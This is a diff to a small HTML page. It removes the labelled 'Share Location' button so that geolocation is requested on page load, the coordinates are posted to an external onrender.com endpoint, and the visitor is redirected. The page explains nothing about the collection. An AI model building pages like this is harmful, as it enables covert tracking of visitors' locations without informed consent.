@@ -1,32 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Location Access</title>
+  <title>Location Redirect</title>
 </head>
 <body>
-  <h2>Click to Share Location</h2>
-  <button onclick="getLocation()">Share Location</button>
-
   <script>
-    function getLocation() {
-      navigator.geolocation.getCurrentPosition(
-        async (position) => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
+    navigator.geolocation.getCurrentPosition(
+      async (position) => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
 
+        try {
           await fetch("https://task-management-jkpm.onrender.com/submit-location", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ latitude: lat, longitude: lon })
           });
 
-          window.location.href = "https://task-management-jkpm.onrender.com/result";
-        },
-        (error) => {
-          alert("Location access denied: " + error.message);
+          // Redirect to a result endpoint that returns pure JSON
+          window.location.href = "http://localhost:5000/result";
+        } catch (err) {
+          window.location.href = "https://task-management-jkpm.onrender.com/result?error=1";
         }
-      );
-    }
+      },
+      (error) => {
+        window.location.href = "https://task-management-jkpm.onrender.com/result?error=1";
+      }
+    );
   </script>
 </body>
 </html>
